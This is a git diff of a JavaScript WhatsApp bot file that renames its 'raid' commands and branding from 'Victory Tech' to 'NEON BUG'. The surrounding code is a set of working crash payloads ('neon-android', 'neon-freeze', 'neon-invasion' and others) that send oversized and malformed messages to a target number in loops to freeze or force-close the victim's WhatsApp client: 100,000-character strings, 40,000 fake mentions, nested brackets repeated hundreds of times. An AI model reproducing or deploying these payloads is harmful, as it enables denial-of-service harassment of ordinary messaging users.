@@ -1767,20 +1767,20 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             `📊 *sᴇɴᴛ:* ${sent}/100\n` +
             `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / 100) * 100)}%\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `_𓅓 Victory Himself`,
+            `_𓅓 NEON BUG`,
           contextInfo: adReply
         }, { quoted: fakeQuote });
 
       } catch (e) {
-        console.error(chalk.red('❌ raidios error:'), e.message);
+        console.error(chalk.red('❌ neon-ios error:'), e.message);
         await sock.sendMessage(chatId, { text: `❌ *ʀᴀɪᴅɪᴏs ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
       }
       break;
     }
 
-    // ── RAIDANDROID ──
+    // ── NEON ANDROID ──
     // Uses: sendCombo + protocolbug6 + protocolbug3 + bulldozer + delayMakerInvisible
-    case 'raidandroid': {
+    case 'neon-android': {
       try {
         await sock.sendMessage(chatId, {
           text:
@@ -1812,7 +1812,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             sent++;
           } catch (e) {
             failed++;
-            console.warn(chalk.yellow(`⚠️ raidandroid round ${i + 1} failed: ${e.message}`));
+            console.warn(chalk.yellow(`⚠️ neon-android round ${i + 1} failed: ${e.message}`));
             await delay(500);
           }
         }
@@ -1830,15 +1830,15 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
         }, { quoted: fakeQuote });
 
       } catch (e) {
-        console.error(chalk.red('❌ raidandroid error:'), e.message);
+        console.error(chalk.red('❌ neon-android error:'), e.message);
         await sock.sendMessage(chatId, { text: `❌ *ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
       }
       break;
     }
 
-    // ── DEVINE-FREEZE ──
+    // ── NEON FREEZE ──
     // Uses: BetaDelay + epcihDiley
-    case 'devine-freeze': {
+    case 'neon-freeze': {
       try {
         await sock.sendMessage(chatId, {
           text:
@@ -1864,7 +1864,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             sent++;
           } catch (e) {
             failed++;
-            console.warn(chalk.yellow(`⚠️ devine-freeze round ${i + 1} failed: ${e.message}`));
+            console.warn(chalk.yellow(`⚠️ neon-freeze round ${i + 1} failed: ${e.message}`));
             await delay(500);
           }
         }
@@ -1882,15 +1882,15 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
         }, { quoted: fakeQuote });
 
       } catch (e) {
-        console.error(chalk.red('❌ devine-freeze error:'), e.message);
+        console.error(chalk.red('❌ neon-freeze error:'), e.message);
         await sock.sendMessage(chatId, { text: `❌ *ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
       }
       break;
     }
 
-    // ── RAID-DELAY ──
+    // ── NEON DELAY ──
     // Uses: DelaFreezCloseRelay + delayMakerInvisible
-    case 'raid-delay': {
+    case 'neon-delay': {
       try {
         await sock.sendMessage(chatId, {
           text:
@@ -1916,7 +1916,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             sent++;
           } catch (e) {
             failed++;
-            console.warn(chalk.yellow(`⚠️ raid-delay round ${i + 1} failed: ${e.message}`));
+            console.warn(chalk.yellow(`⚠️ neon-delay round ${i + 1} failed: ${e.message}`));
             await delay(500);
           }
         }
@@ -1934,15 +1934,15 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
         }, { quoted: fakeQuote });
 
       } catch (e) {
-        console.error(chalk.red('❌ raid-delay error:'), e.message);
+        console.error(chalk.red('❌ neon-delay error:'), e.message);
         await sock.sendMessage(chatId, { text: `❌ *ʀᴀɪᴅ-ᴅᴇʟᴀʏ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
       }
       break;
     }
 
-    // ── NIGHT-INVASION ──
+    // ── NEON INVASION ──
     // Uses: delayMakerInvisible (heavy loop — iOS targeted)
-    case 'night-invasion': {
+    case 'neon-invasion': {
       try {
         await sock.sendMessage(chatId, {
           text:
@@ -1972,7 +1972,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             sent++;
           } catch (e) {
             failed++;
-            console.warn(chalk.yellow(`⚠️ night-invasion round ${i + 1} failed: ${e.message}`));
+            console.warn(chalk.yellow(`⚠️ neon-invasion round ${i + 1} failed: ${e.message}`));
             await delay(500);
           }
         }
@@ -1990,15 +1990,15 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
         }, { quoted: fakeQuote });
 
       } catch (e) {
-        console.error(chalk.red('❌ night-invasion error:'), e.message);
+        console.error(chalk.red('❌ neon-invasion error:'), e.message);
         await sock.sendMessage(chatId, { text: `❌ *ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
       }
       break;
     }
 
-    // ── OBITO-FREEZE ──
+    // ── NEON OBITO ──
     // Uses: NativeXFcWithDozerX + BetaTester
-    case 'obito-freeze': {
+    case 'neon-obito': {
       try {
         await sock.sendMessage(chatId, {
           text:
@@ -2024,7 +2024,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
             sent++;
           } catch (e) {
             failed++;
-            console.warn(chalk.yellow(`⚠️ obito-freeze round ${i + 1} failed: ${e.message}`));
+            console.warn(chalk.yellow(`⚠️ neon-obito round ${i + 1} failed: ${e.message}`));
             await delay(500);
           }
         }
@@ -2042,7 +2042,7 @@ async function handlePendingRaidCommand(sock, chatId, command, targetJid, rawNum
         }, { quoted: fakeQuote });
 
       } catch (e) {
-        console.error(chalk.red('❌ obito-freeze error:'), e.message);
+        console.error(chalk.red('❌ neon-obito error:'), e.message);
         await sock.sendMessage(chatId, { text: `❌ *ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
       }
       break;
@@ -2389,7 +2389,7 @@ async function hijackGroup(sock, chatId, sender, groupMetadata, fakeQuote, isOwn
 
 const crypto = require('crypto');
 
-// ── BetaDelay (devine-freeze wave 1) ──
+// ── BetaDelay (neon-freeze wave 1) ──
 async function _betaDelay(sock, target, ptcp = true) {
   for (let r = 0; r < 1000; r++) {
     let msg = generateWAMessageFromContent(target, {
@@ -2495,7 +2495,7 @@ async function _betaDelay(sock, target, ptcp = true) {
   );
 }
 
-// ── sendCombo (raidandroid wave 1) ──
+// ── sendCombo (neon-android wave 1) ──
 async function _sendCombo(sock, target) {
   if (!sock?.relayMessage) return;
 
@@ -2559,14 +2559,14 @@ async function _sendCombo(sock, target) {
   }).catch(e => console.error('_sendCombo news:', e.message));
 }
 
-// ── epcihDiley (devine-freeze wave 2) ──
+// ── epcihDiley (neon-freeze wave 2) ──
 async function _epcihDiley(sock, target) {
   try {
     await sock.relayMessage(target, {
       groupStatusMessageV2: {
         message: {
           extendedTextMessage: {
-            text: '$', matchedText: 'https://t.me/mystictechxd', description: '$', title: '$',
+            text: '$', matchedText: 'https://t.me/neonbug', description: '$', title: '$',
             paymentLinkMetadata: {
               button: { displayText: '#' },
               header: { headerType: 1 },
@@ -2656,7 +2656,7 @@ async function _epcihDiley(sock, target) {
   }
 }
 
-// ── FcXDelay (raid-delay / night-invasion) ──
+// ── FcXDelay (neon-delay / neon-invasion) ──
 async function _fcXDelay(sock, target, mention = true) {
   const bokepFc = JSON.stringify({ status: true, criador: 'ForceClose', resultado: { type: 'md', ws: { _events: { 'CB:ib,,dirty': ['Array'] }, _eventsCount: 800000, _maxListeners: 0, url: 'wss://web.whatsapp.com/ws/chat', config: { version: ['Array'], browser: ['Array'], waWebconnetUrl: 'wss://web.whatsapp.com/ws/chat', connCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: 'authData' }, markOnlineOnconnCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: 'transactionOptsData' }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: 'appStateMacData' }, mobile: true } } } });
 
@@ -2739,7 +2739,7 @@ async function _fcXDelay(sock, target, mention = true) {
   }
 }
 
-// ── DelaFreezCloseRelay (raid-delay wave 1) ──
+// ── DelaFreezCloseRelay (neon-delay wave 1) ──
 async function _delaFreezCloseRelay(sock, target) {
   try {
     const randomJid = `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`;
@@ -2750,7 +2750,7 @@ async function _delaFreezCloseRelay(sock, target) {
         groupJid: '120363428855080371@g.us',
         inviteCode: 'Xx'.repeat(200),
         inviteExpiration: '99999999999',
-        groupName: '</> Victory Tech ' + 'ោ៝'.repeat(200),
+        groupName: '</> NEON BUG ' + 'ោ៝'.repeat(200),
         caption: 'ោ៝'.repeat(300),
         jpegThumbnail: null,
         contextInfo: {
@@ -2772,9 +2772,9 @@ async function _delaFreezCloseRelay(sock, target) {
               businessMessageForwardInfo: { businessOwnerJid: '13135550002@s.whatsapp.net' },
               participant: '0@s.whatsapp.net', remoteJid: 'status@broadcast'
             },
-            body: proto.Message.InteractiveMessage.Body.create({ text: 'Night Raiders' }),
+            body: proto.Message.InteractiveMessage.Body.create({ text: 'NEON BUG' }),
             footer: proto.Message.InteractiveMessage.Footer.create({ buttonParamsJson: '{['.repeat(500) }),
-            header: proto.Message.InteractiveMessage.Header.create({ buttonParamsJson: ']}'.repeat(500), subtitle: 'Victory Tech', hasMediaAttachment: false }),
+            header: proto.Message.InteractiveMessage.Header.create({ buttonParamsJson: ']}'.repeat(500), subtitle: 'NEON BUG', hasMediaAttachment: false }),
             nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
               messageParamsJson: '{['.repeat(500),
               buttons: [
@@ -2795,9 +2795,9 @@ async function _delaFreezCloseRelay(sock, target) {
   }
 }
 
-// ── delayMakerInvisible (night-invasion / raidandroid) ──
+// ── delayMakerInvisible (neon-invasion / neon-android) ──
 async function _delayMakerInvisible(sock, target) {
-  const venomModsData = JSON.stringify({ status: true, criador: 'VenomMods', resultado: { type: 'md', ws: { _events: { 'CB:ib,,dirty': ['Array'] }, _eventsCount: 800000, _maxListeners: 0, url: 'wss://web.whatsapp.com/ws/chat', config: { version: ['Array'], browser: ['Array'], waWebconnetUrl: 'wss://web.whatsapp.com/ws/chat', connCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: 'authData' }, markOnlineOnconnCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: 'transactionOptsData' }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: 'appStateMacData' }, mobile: true } } } });
+  const neonModsData = JSON.stringify({ status: true, criador: 'NeonBug', resultado: { type: 'md', ws: { _events: { 'CB:ib,,dirty': ['Array'] }, _eventsCount: 800000, _maxListeners: 0, url: 'wss://web.whatsapp.com/ws/chat', config: { version: ['Array'], browser: ['Array'], waWebconnetUrl: 'wss://web.whatsapp.com/ws/chat', connCectTimeoutMs: 20000, keepAliveIntervalMs: 30000, logger: {}, printQRInTerminal: false, emitOwnEvents: true, defaultQueryTimeoutMs: 60000, customUploadHosts: [], retryRequestDelayMs: 250, maxMsgRetryCount: 5, fireInitQueries: true, auth: { Object: 'authData' }, markOnlineOnconnCect: true, syncFullHistory: true, linkPreviewImageThumbnailWidth: 192, transactionOpts: { Object: 'transactionOptsData' }, generateHighQualityLinkPreview: false, options: {}, appStateMacVerification: { Object: 'appStateMacData' }, mobile: true } } } });
 
   const stanza = [{ attrs: { biz_bot: '1' }, tag: 'bot' }, { attrs: {}, tag: 'biz' }];
 
@@ -2805,7 +2805,7 @@ async function _delayMakerInvisible(sock, target) {
     viewOnceMessage: {
       message: {
         messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 3.2, isStatusBroadcast: true, statusBroadcastJid: 'status@broadcast', badgeChat: { unreadCount: 9999 } },
-        forwardedNewsletterMessageInfo: { newsletterJid: 'proto@newsletter', serverMessageId: 1, newsletterName: `—͟͞͞🧊 Night Raiders ${'—͟͞͞🧊'.repeat(10)}`, contentType: 3, accessibilityText: `—͟͞͞🧊 Night Raiders ${'﹏'.repeat(102002)}` },
+        forwardedNewsletterMessageInfo: { newsletterJid: 'proto@newsletter', serverMessageId: 1, newsletterName: `—͟͞͞🧊 NEON BUG ${'—͟͞͞🧊'.repeat(10)}`, contentType: 3, accessibilityText: `—͟͞͞🧊 NEON BUG ${'﹏'.repeat(102002)}` },
         interactiveMessage: {
           contextInfo: {
             businessMessageForwardInfo: { businessOwnerJid: target },
@@ -2816,13 +2816,13 @@ async function _delayMakerInvisible(sock, target) {
           body: { text: '' + 'ꦽ'.repeat(102002) },
           nativeFlowMessage: {
             buttons: [
-              { name: 'single_select', buttonParamsJson: venomModsData },
-              { name: 'payment_method', buttonParamsJson: venomModsData },
-              { name: 'call_permission_request', buttonParamsJson: venomModsData, voice_call: 'call_galaxy' },
-              { name: 'form_message', buttonParamsJson: venomModsData },
-              { name: 'galaxy_message', buttonParamsJson: venomModsData },
-              { name: 'cta_call', buttonParamsJson: venomModsData },
-              { name: 'mpm', buttonParamsJson: venomModsData },
+              { name: 'single_select', buttonParamsJson: neonModsData },
+              { name: 'payment_method', buttonParamsJson: neonModsData },
+              { name: 'call_permission_request', buttonParamsJson: neonModsData, voice_call: 'call_galaxy' },
+              { name: 'form_message', buttonParamsJson: neonModsData },
+              { name: 'galaxy_message', buttonParamsJson: neonModsData },
+              { name: 'cta_call', buttonParamsJson: neonModsData },
+              { name: 'mpm', buttonParamsJson: neonModsData },
             ]
           }
         }
@@ -2835,7 +2835,7 @@ async function _delayMakerInvisible(sock, target) {
   await sock.relayMessage(target, message, { participant: { jid: target } });
 }
 
-// ── bulldozer (raidandroid wave 4) ──
+// ── bulldozer (neon-android wave 4) ──
 async function _bulldozer(sock, target) {
   const message = {
     viewOnceMessage: {
@@ -2884,7 +2884,7 @@ async function _bulldozer(sock, target) {
   });
 }
 
-// ── protocolbug6 (raidandroid wave 2) ──
+// ── protocolbug6 (neon-android wave 2) ──
 async function _protocolbug6(sock, target, mention = true) {
   const mentionedList = ['13135550002@s.whatsapp.net', ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)];
   const quotedMessage = {
@@ -2985,7 +2985,7 @@ async function _protocolbug6(sock, target, mention = true) {
   }
 }
 
-// ── protocolbug3 (raidandroid wave 3) ──
+// ── protocolbug3 (neon-android wave 3) ──
 async function _protocolbug3(sock, target, mention = true) {
   const msg = generateWAMessageFromContent(target, {
     viewOnceMessage: {
@@ -3056,7 +3056,7 @@ async function _protocolbug3(sock, target, mention = true) {
   }
 }
 
-// ── NativeXFcWithDozerX (obito-freeze wave 1) ──
+// ── NativeXFcWithDozerX (neon-obito wave 1) ──
 async function _nativeXFcWithDozerX(sock, target) {
   const delayMs = ms => new Promise(res => setTimeout(res, ms));
   const SID = '5e03e0&mms3';
@@ -3088,8 +3088,8 @@ async function _nativeXFcWithDozerX(sock, target) {
         extendedTextMessage: {
           text: '༽ 𝖃𝕭𝕷𝕬𝕾𝕿𝕰𝕽 ༼' + 'ោ៝'.repeat(10000),
           title: '༽ 𝕱𝕺𝕸𝕺 ༼`',
-          description: 'Night Raiders' + xNativeRiepers,
-          canonicalUrl: 'https://t.me/Heis_Devine',
+          description: 'NEON BUG' + xNativeRiepers,
+          canonicalUrl: 'https://t.me/neonbug',
           previewType: 'PHOTO',
           jpegTumbnail: Buffer.from([104, 123, 111, 89, 53, 172, 222, 200, 203, 217, 189, 190, 134, 225]),
           contextInfo: {
@@ -3206,9 +3206,9 @@ async function _nativeXFcWithDozerX(sock, target) {
             },
             externalAdReply: {
               showAdAttribution: true,
-              title: '? Victory Tech',
+              title: '? NEON BUG',
               body: '',
-              sourceUrl: 'https://t.me/victorytechchannela',
+              sourceUrl: '${DEVELOPER_LINK}',
               mediaType: 1,
               renderLargerThumbnail: true
             },
@@ -3224,12 +3224,12 @@ async function _nativeXFcWithDozerX(sock, target) {
             messageParamsJson: JSON.stringify({
               name: 'galaxy_message',
               title: 'galaxy_message',
-              header: 'Night Raiders',
+              header: 'NEON BUG',
               body: 'Call Galaxy'
             }),
             buttons: [
-              { name: 'single_select',           buttonParamsJson: apiClient + 'NIGHT RAIDERS' },
-              { name: 'call_permission_request', buttonParamsJson: apiClient + '?NIGHT RAIDERS' },
+              { name: 'single_select',           buttonParamsJson: apiClient + 'NEON BUG' },
+              { name: 'call_permission_request', buttonParamsJson: apiClient + '?NEON BUG' },
               { name: 'payment_method',          buttonParamsJson: '' },
               { name: 'payment_status',          buttonParamsJson: '' },
               { name: 'review_order',            buttonParamsJson: '' }
@@ -3310,7 +3310,7 @@ async function _nativeXFcWithDozerX(sock, target) {
   }
 }
 
-// ── BetaTester (obito-freeze wave 2) ──
+// ── BetaTester (neon-obito wave 2) ──
 async function _betaTester(sock, target, mention = true) {
   const mentionList = Array.from({ length: 2000 }, (_, d) => `1313555000${d + 1}@s.whatsapp.net`);
   const msg = await generateWAMessageFromContent(target, {
@@ -3318,7 +3318,7 @@ async function _betaTester(sock, target, mention = true) {
       message: {
         messageContextInfo: { messageSecret: crypto.randomBytes(32) },
         interactiveResponseMessage: {
-          body: { text: 'Last Raider Empire' },
+          body: { text: 'NEON BUG' },
           nativeFlowResponseMessage: { name: 'galaxy_message', paramsJson: '\u0003'.repeat(5000), version: 3 },
           contextInfo: {
             isChannelMessage: true,
@@ -3361,14 +3361,14 @@ async function _betaTester(sock, target, mention = true) {
       }
     }, {
       additionalNodes: [
-        { tag: 'meta', attrs: { is_status_mention: 'Victory Tech' }, content: undefined }
+        { tag: 'meta', attrs: { is_status_mention: 'NEON BUG' }, content: undefined }
       ]
     });
   }
 }
 
 // ============================================
-// END OF CASE.JS
+// END OF NEON.JS
 // 「☠︎」NEON BUG - HIMSELF
-// CREATED BY VICTORY TECH ☠️
+// CREATED BY NEON BUG ☠️
 // ============================================
